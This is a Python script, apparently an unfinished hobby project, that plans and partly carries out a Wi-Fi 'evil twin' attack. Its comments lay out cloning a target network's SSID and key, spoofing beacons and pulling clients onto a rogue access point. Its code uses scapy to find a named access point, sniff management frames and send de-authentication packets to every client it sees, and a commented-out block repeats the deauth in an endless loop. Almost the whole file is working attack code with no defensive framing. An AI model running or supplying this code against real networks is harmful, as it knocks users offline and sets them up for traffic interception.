# Get SSIDS in wifi medium (scan network)

# Choose one SSID to emulate - e.g. based on WPA2, name, number of clients connected to it

# Can we crack the key in order to create our own AP? if not go to next..

# Create rogue AP with same SSID+key

# Send beacon frames where we look like good AP (but we are the bad AP)

# De-auth clients connected to SSID

# Let clients connect to our rogue AP

from scanner import Scanner
from deauth import deauth_clients, deauth
from scapy.all import sendp, Dot11Elt, Dot11, RadioTap, Dot11Deauth, sniff

INTERFACE = "wlan0"
TIMEOUT = 5

AP_TO_ATTACK = "Sams 9"

with Scanner(INTERFACE) as scanner:
    AP_info = scanner.get_ap(timeout=TIMEOUT, specific_ap=AP_TO_ATTACK)
    print(AP_info)
    print(scanner.wifis)
    channel = AP_info.Channel[0]
    BSSID = AP_info.index[0]
    
    # change channel to be on APs channel
    scanner.set_channel(channel)
    print(f"Channel is: {scanner.curr_channel}")
    # Deauth clients

    def check_deauth(pkt):
        print("Recived package")
        elt = pkt[Dot11Elt]
        while elt and elt.ID != 0:
            elt = elt.payload[Dot11Elt]
        print(elt.info)
        # if pkt[Dot11].addr1 == BSSID:
        deauth(INTERFACE, BSSID, pkt[Dot11].addr2, 6)

    sniff(iface=INTERFACE, prn=check_deauth, filter="type mgt") #subtype assoc-req")  # start sniffin



# channel = AP_info.Channel[0]
# BSSID = AP_info.index[0]

# print(AP_info.Channel)
# print(BSSID[0])
# os.system(f"iwconfig {INTERFACE} channel {channel}")
# # clients = get_clients_on_ap(timeout=10, iface=INTERFACE, BSSID=BSSID)

# # Deauth clients
# while True:
#     print("Deauthenticating clients...")
#     reason_code = random.randint(1, 68)
#     deauth_clients(iface=INTERFACE, clients=clients, AP_mac=BSSID, reasoncode=reason_code)
